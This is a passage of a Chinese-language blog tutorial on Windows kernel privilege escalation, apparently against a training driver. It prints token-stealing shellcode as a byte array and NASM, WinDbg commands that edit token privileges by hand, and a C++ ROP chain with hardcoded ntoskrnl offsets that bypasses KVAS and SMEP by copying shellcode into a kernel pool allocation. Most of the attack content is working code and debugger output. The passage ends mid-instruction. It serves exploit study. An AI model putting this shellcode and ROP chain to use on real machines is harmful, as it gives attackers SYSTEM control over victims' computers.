&#123;</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0xb8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>,</span><br><span class="line"><span class="number">0xc1</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>, <span class="number">0xf8</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xfa</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xf0</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>,</span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe2</span>, <span class="number">0xf8</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x89</span>, <span class="number">0xb8</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xca</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x89</span>, <span class="number">0x91</span>, <span class="number">0xb8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x8b</span>, <span class="number">0x88</span>, <span class="number">0xe4</span>, <span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0xff</span>, <span class="number">0xc1</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xe4</span>, <span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x8b</span>, <span class="number">0x8a</span>, <span class="number">0x68</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4c</span>, <span class="number">0x8b</span>, <span class="number">0x9a</span>, <span class="number">0x78</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xa2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xaa</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0xf8</span>, <span class="number">0x48</span>, <span class="number">0x0f</span>, <span class="number">0x07</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>写入一个二进制文档，用ida逆向</p><p><img src="https://img.joe1sn.top/uploads/big/ad5f9f69c5c817f016f3af5ca4717316.png" alt="image-20240119202727334" /></p><p>发现原理一致，最后对栈的恢复不同</p><p>已知<code>gs:[0x188]</code>指向一个<code>_KTHREAD</code>结构体</p><p><img src="https://img.joe1sn.top/uploads/big/f0a5031af56eee9d505358818846a94e.png" alt="image-20240120112824920" /></p><p>根据windbg的调试结果知道</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mov cx, [rax+0x1e4];+0x1e4 KernelApcDisable : 0n-1</span><br><span class="line">inc cx;</span><br><span class="line">mov [rax+0x1e4], cx;更新KernelApcDisable为0</span><br><span class="line">mov rdx, [rax+0x90];+0x090 [TrapFrame]: 0xfffff88e`1d2edb00 </span><br><span class="line">;_KTRAP_FRAME</span><br><span class="line">;---下面为_KTRAP_FRAME</span><br><span class="line">mov rcx, [rdx+0x168];[+0x168] Rip</span><br><span class="line">mov r11, [rdx+0x178];[+0x178] EFlags</span><br><span class="line">mov rsp, [rdx+0x180];[+0x180] Rsp</span><br><span class="line">mov rbp, [rdx+0x158];[+0x158] Rbp</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/6a427f532364b38c531a30c8e66922c5.png" alt="image-20240120113526235" /></p><p>可能还是有点😵，反汇编一下<code>TrapFrame</code>的RIP</p><p><img src="https://img.joe1sn.top/uploads/big/c053402edbe07075e363de45ec014e8d.png" alt="image-20240120113739799" /></p><p>相当于通过<code>TrapFrame</code>，替换了exp中的<code>DeviceIoControl</code>（模仿正常执行），并让他正常返回</p><p>接着重定位GS寄存器，使用sysret返回，为了对齐，有的汇编是这样的写的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o64 sysret; nasm shit</span><br></pre></td></tr></table></figure><h2 id="d-开启token所有权限-优化shellcode"><a class="markdownIt-Anchor" href="#d-开启token所有权限-优化shellcode"></a> D. 开启Token所有权限 [优化shellcode]</h2><p>即使我们已经成功生成了令牌，但是功能依旧是不全的</p><p><img src="https://img.joe1sn.top/uploads/big/f5b2dd61f571c1edcc1a160ddd63139a.png" alt="image-20240120114406196" /></p><p>被禁用的功能依旧有很多</p><h3 id="i-开启当前权限为启用"><a class="markdownIt-Anchor" href="#i-开启当前权限为启用"></a> I. 开启当前权限为启用</h3><p>重新打开一个普通用户的<code>cmd.exe</code></p><p><img src="https://img.joe1sn.top/uploads/big/c2da1e221a9d8e62c9a4ae27901bf004.png" alt="image-20240120125235344" /></p><p>用A部分的方法找到该进程</p><p><img src="https://img.joe1sn.top/uploads/big/50a5f3dc61a7e608b21298558bec4cd4.png" alt="image-20240120125516929" /></p><p>查看token格式，对照一下SID。（注意低位要为0）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!token &lt;Token数值，但是个位数为0&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/c3cdd2d87ff279e4761888663f50107e.png" alt="image-20240120125615410" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dt !_sep_token_privileges 0xffffb106`ecc96060+0x40</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/33d8902ffc4e5dedfac463bebb0bd38e.png" alt="image-20240120130022681" /></p><p>将Enabled值设置为Present值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eq 0xffffb106`ecc96060+0x40+8 0x00000006`02880000</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/cbe5b50b2b24ebedaefea6bf4e406ea0.png" alt="image-20240120130054144" /></p><p>查看权限</p><p><img src="https://img.joe1sn.top/uploads/big/d3567ad9cbcbac4a49c839f81cb11751.png" alt="image-20240120130116310" /></p><h3 id="ii-获得所有权限并启用"><a class="markdownIt-Anchor" href="#ii-获得所有权限并启用"></a> II. 获得所有权限并启用</h3><p>用A部分的方法得到System的Token</p><p><img src="https://img.joe1sn.top/uploads/big/b44eaf47a38695dc4a35d9f25a958054.png" alt="image-20240120130740237" /></p><p>再得到SystemToken的Present值</p><p><img src="https://img.joe1sn.top/uploads/big/a8398e0631de11a93f09ef3f4d3c4dee.png" alt="image-20240120132052083" /></p><p>设置当前Token的Present和Enabled为该值</p><p><img src="https://img.joe1sn.top/uploads/big/70610eb7cea6455cb6dcd0032cb200b3.png" alt="image-20240120132313137" /></p><p>查看权限</p><p><img src="https://img.joe1sn.top/uploads/big/06841330f3a322ab5896df99084d3acf.png" alt="image-20240120132350635" /></p><h3 id="iii重新编写shellcode"><a class="markdownIt-Anchor" href="#iii重新编写shellcode"></a> III.重新编写shellcode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[Bits 64]</span><br><span class="line"></span><br><span class="line">_start:    </span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rax, gs:[rax + 0x188]</span><br><span class="line">    mov rax, [rax + 0xb8]     ;rax = 当前EPROCESS</span><br><span class="line">    mov r9, rax               ;r9  = 当前EPROCESS</span><br><span class="line">    mov rax, [rax + 0x448]    ;rax = 当前EPROCESS.List</span><br><span class="line">    mov rax, [rax]            ;rax = 当前EPROCESS.List-&gt;flink</span><br><span class="line"></span><br><span class="line">__loop:</span><br><span class="line">    mov rdx, [rax - 0x8]      ;rdx = 上一个进程的 upid</span><br><span class="line">    mov r8, rax               ;r8  = 当前EPROCESS.List-&gt;flink</span><br><span class="line">    mov rax, [rax]            ;rax = 上一个进程的.List</span><br><span class="line">    cmp rdx, 0x4</span><br><span class="line">    jnz __loop</span><br><span class="line"></span><br><span class="line">    ;rdx = 4</span><br><span class="line">    ;r8 = System EPROCESS</span><br><span class="line">    mov rdx, [r8+0x70]      ;rdx = system token</span><br><span class="line">    and rdx, -0x8           ;消除低4位</span><br><span class="line">    mov rcx, [r9+0x4b8]     ;当前EPROCESS的token</span><br><span class="line">    and rcx, 0x7            ;</span><br><span class="line">    add rdx, rcx            ;rdx = 系统token高位+当前token低4位</span><br><span class="line">    mov [r9+0x4b8], rdx     ;将合成的token复制给当前</span><br><span class="line"></span><br><span class="line">    ;Enable ALL</span><br><span class="line">    mov rdx, [r8 + 0x70]      ;rdx = system token</span><br><span class="line">    and rdx, 0xFFFFFFFFFFFFFFF0           ;system token: 消除低8位，便于解析Token</span><br><span class="line">    mov rbx, [rdx + 0x40]     ;rbx = System token的Present</span><br><span class="line">    mov rcx, [r9 + 0x4b8]     ;rcx = 新的EPROCESS的token</span><br><span class="line">    and rcx, 0xFFFFFFFFFFFFFFF0           ;new current token: 消除低8位，便于解析Token</span><br><span class="line">    mov [rcx + 0x40], rbx</span><br><span class="line">    mov [rcx + 0x48], rbx</span><br><span class="line"></span><br><span class="line">    xor rax, rax</span><br><span class="line">    add rsp, 0x10</span><br><span class="line">    retn</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/7a422f59bf47ec0ff9c55f9f9d5c580d.png" alt="image-20240120134710391" /></p><h1 id="kvas"><a class="markdownIt-Anchor" href="#kvas"></a> KVAS</h1><h2 id="a-简介"><a class="markdownIt-Anchor" href="#a-简介"></a> A. 简介</h2><p>KVAS全称是Kernel Virtual Address Shadow，它的出现与MeltDown（CVE-2017-5754）和TotalMeltDown（CVE-2018-1038）有关。</p><p>我的描述不一定准确，大致上来说这两个漏洞利用了CPU的乱序执行技术，即CPU在执行时不一定会按照流程执行。当我们访问一个不能被用户模式访问的内存页时，CPU会执行该语句然后将其缓存到内存中，等到发现不能访问后返回错误，但是该数据依旧存在于缓存当中。利用这种思路就可以完全读取内核中的数据，实现权限提升等。</p><p>微软为了缓解该漏洞，从用户页表中隔离出内核页表，让用户态访问到的内核页表也是经过映射的，并且会将用户页表自动标记为NX，让我们的shellcode无法执行</p><h2 id="b-bypass"><a class="markdownIt-Anchor" href="#b-bypass"></a> B. Bypass</h2><p>虽然用户页表为不可执行，<strong>但是内核页表仍然可执行</strong>，只不过会延长我们ROP链的长度</p><p>需要用到的函数是：<code>ExAllocatePoolWithTag</code>和<code>RtlCopyMemory</code></p><ul><li><code>ExAllocatePoolWithTag</code>：用于在内核中开辟一块地址</li><li><code>RtlCopyMemory</code>：复制内存到内核开辟的内存池</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LPVOID space = <span class="built_in">ExAllocatePoolWithTag</span>(<span class="number">0</span>, <span class="number">0x100</span>, <span class="number">0xDEAD</span>);</span><br><span class="line"><span class="comment">//NonPagedPoolExecute = 0</span></span><br><span class="line"><span class="comment">//空间大小：0x100</span></span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(space, shellcode_addr, <span class="number">0x100</span>);</span><br></pre></td></tr></table></figure><p>MSDN中说明该两个函数在内核中均位于<code> NtosKrnl.exe</code>里，我们可以利用第一章的内容寻找到该地址，可以使用CFF Explorer查看导出表找到函数</p><p><img src="https://img.joe1sn.top/uploads/big/866de1aad36e03df79f0a3f799ca2e72.png" alt="image-20240120143139338" /></p><p><img src="https://img.joe1sn.top/uploads/big/59a09be3f8b2929ced592f3a4901f054.png" alt="image-20240120143245405" /></p><p>需要说明的一点是<code>ExAllocatePoolWithTag</code>有一个很恶心的地方就是</p><p><img src="https://img.joe1sn.top/uploads/big/324967fd2b7f547949278ef9bfa00206.png" alt="image-20240120213553032" /></p><p>这三个mov会打乱我们精心设计的ROP链，而且后面根本没有使用到他，所以要直接进入<code>push rdi</code>的位置</p><p><code>RtlCopyMemory</code>其实是一个宏</p><p><img src="https://img.joe1sn.top/uploads/big/9bb79876c8b14924e6704969dc963280.png" alt="image-20240120155359370" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ulExAllocatePoolWithTag = base + <span class="number">0x9B203F</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ulRtlCopyMemory = base + <span class="number">0x40BEC0</span>;</span><br></pre></td></tr></table></figure><p>根据微软的函数调用规则，传参顺序是<code>rcx</code>，<code>rdx</code>，<code>r8</code>，返回地参数在<code>rax</code>中</p><p>那么一个理想的ROP布局</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pop rcx rdx r8 ret</span><br><span class="line">0</span><br><span class="line">0x100</span><br><span class="line">0xDEAD</span><br><span class="line">ExAllocatePoolWithTag</span><br><span class="line">---------------------------</span><br><span class="line">pop rcx rdx r8 ret</span><br><span class="line">0;暂时</span><br><span class="line">shellcode_addr</span><br><span class="line">0x100;</span><br><span class="line">mov rcx, rax ret;此时rcx = ExAllocatePoolWithTag返回地内存地址</span><br><span class="line">RtlCopyMemory</span><br><span class="line">---------------------------</span><br><span class="line">jmp rax</span><br></pre></td></tr></table></figure><p>就这些gadget中的pop会消除<code>rsp+0x28</code>的驱动的<code>Handle</code>函数返回地址，所以首先是抬栈，如<code>sub rsp, 0x100</code>，在<code>jmp rax</code>之前多次调用<code>ret</code>来抬升<code>rsp</code>的值，最终回到<code>shellcode</code>调整为适用的<code>rsp</code>值。</p><p><strong>实际情况中也不会有恰好的gadget用</strong></p><p>实际上能用的<code>mov rcx, rax</code>可以通过以下方式实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x00000001408fa783 : push rax ; push rbx ; ret</span><br><span class="line">0x00000001408fa77b : push rax ; push rdi ; ret</span><br><span class="line">0x000000014020262C : pop rdi ; ret</span><br></pre></td></tr></table></figure><p>这样就能让rcx=rax了，布局后栈的情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ulExAllocatePoolWithTag</span><br><span class="line">pop_rdi</span><br><span class="line">pop_rcx</span><br><span class="line">push_rax_rdi</span><br></pre></td></tr></table></figure><ol><li><code>pop rdi</code>：<code>RDI</code> =<code>pop rcx地址</code>，出栈一个，<code>rsp</code>指向<code>push_rax_rdi</code>，然后<code>ret</code>跳转到该地址</li><li><code>push rax</code>：将申请的内核内存地址放到了栈上，<code>rsp</code>指向值就为该内存的地址</li><li><code>push rdi; ret</code>：等效于<code>jmp rdi</code>，于是<code>ret</code>到了<code>pop rcx</code></li><li><code>pop rcx</code>：此时的栈顶为 2 中入栈的<code>rax</code></li></ol><p><img src="https://img.joe1sn.top/uploads/big/28b0466a118932c4725e7f24168cef31.png" alt="image-20240120214435516" /></p><p>成功让<code>RCX=RAX</code></p><p><img src="https://img.joe1sn.top/uploads/big/68943ef85bb247fa007f3cfcc84cc1e2.png" alt="image-20240120214609588" /></p><p>这里暂时设计payload</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//typedef unsigned long long funcaddr;</span></span><br><span class="line"></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span>) = (funcaddr)pop_rcx;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">8</span>) = (funcaddr)<span class="number">0</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x10</span>) = (funcaddr)pop_rdx;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x18</span>) = (funcaddr)<span class="number">0x100</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x20</span>) = (funcaddr)pop_r8;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x28</span>) = (funcaddr)<span class="number">0xDEAD</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x30</span>) = (funcaddr)ulExAllocatePoolWithTag;</span><br><span class="line"></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x38</span>) = (funcaddr)pop_rdi;<span class="comment">//rsp = 0</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x40</span>) = (funcaddr)pop_rcx;<span class="comment">//rdi = rcx --- been force to zero</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x48</span>) = (funcaddr)push_rax_rdi;<span class="comment">//ret rdi: pop_rcx value changed</span></span><br><span class="line"></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x50</span>) = (funcaddr)pop_rdx;<span class="comment">//此处被低位被清零</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x58</span>) = (funcaddr)shellcode_addr; </span><br><span class="line"></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x70</span>) = (funcaddr)pop_r8;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x78</span>) = (funcaddr)<span class="built_in">sizeof</span>(cmd);</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x80</span>) = (funcaddr)ulRtlCopyMemory;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x88</span>) = (funcaddr)jmp_rax;</span><br></pre></td></tr></table></figure><p>但是进行<code>ExAllocatePoolWithTag</code></p><p><img src="https://img.joe1sn.top/uploads/big/bd6c315f3f534e5d95e65b69621299b0.png" alt="image-20240121084806324" /></p><p>打断了ROP链，让<code>rsp+68</code>的位置的低32位清零了，这让我们需要调整这段rop链</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x50</span>) = (funcaddr)pop_rdx;<span class="comment">//此处被低位被清零</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x58</span>) = (funcaddr)shellcode_addr; </span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x60</span>) = (funcaddr)pop_rdx;<span class="comment">//恢复rdx</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x68</span>) = (funcaddr)shellcode_addr;</span><br><span class="line">   </span><br><span class="line">   *(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x70</span>) = (funcaddr)pop_r8;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x818</span> + <span class="number">0x78</span>) = (funcaddr)<span class="built_in">sizeof</span>(cmd);</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/bedc06d732b94afafa28a2688c0a94d6.png" alt="image-20240121093505807" /></p><p>在设置<code>CR4.SMEP</code>的情况下，依靠内核分配的内存，成功运行了shellcode，ROP链进行了多次调用，让最后shellcode中的<code>rsp</code>值不好估计，并且栈的情况可能随着函数的调用将原有的值抹去，<strong>这里先把shellcode换成从TrapFrame返回的</strong></p><p><img src="https://img.joe1sn.top/uploads/big/39d57b872ac0473e469f8056ebedb9d3.png" alt="image-20240121095833438" /></p><h2 id="c-优化shellcode"><a class="markdownIt-Anchor" href="#c-优化shellcode"></a> C. 优化shellcode</h2><p>所以这段shellcode参考shellcode编写的C、D部分，加上了所有功能Enabled的shellcode片段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">[Bits 64]</span><br><span class="line"></span><br><span class="line">_start:    </span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rax, gs:[rax + 0x188]</span><br><span class="line">    mov rax, [rax + 0xb8]     ;rax = 当前EPROCESS</span><br><span class="line">    mov r9, rax               ;r9  = 当前EPROCESS</span><br><span class="line">    mov rax, [rax + 0x448]    ;rax = 当前EPROCESS.List</span><br><span class="line">    mov rax, [rax]            ;rax = 当前EPROCESS.List-&gt;flink</span><br><span class="line"></span><br><span class="line">__loop:</span><br><span class="line">    mov rdx, [rax - 0x8]      ;rdx = 上一个进程的 upid</span><br><span class="line">    mov r8, rax               ;r8  = 当前EPROCESS.List-&gt;flink</span><br><span class="line">    mov rax, [rax]            ;rax = 上一个进程的.List</span><br><span class="line">    cmp rdx, 0x4</span><br><span class="line">    jnz __loop</span><br><span class="line"></span><br><span class="line">    ;rdx = 4</span><br><span class="line">    ;r8 = System EPROCESS</span><br><span class="line"></span><br><span class="line">    mov rdx, [r8+0x70]      ;rdx = system token</span><br><span class="line">    and rdx, -0x8           ;消除低4位</span><br><span class="line">    mov rcx, [r9+0x4b8]     ;当前EPROCESS的token</span><br><span class="line">    and rcx, 0x7            ;</span><br><span class="line">    add rdx, rcx            ;rdx = 系统token高位+当前token低4位</span><br><span class="line">    mov 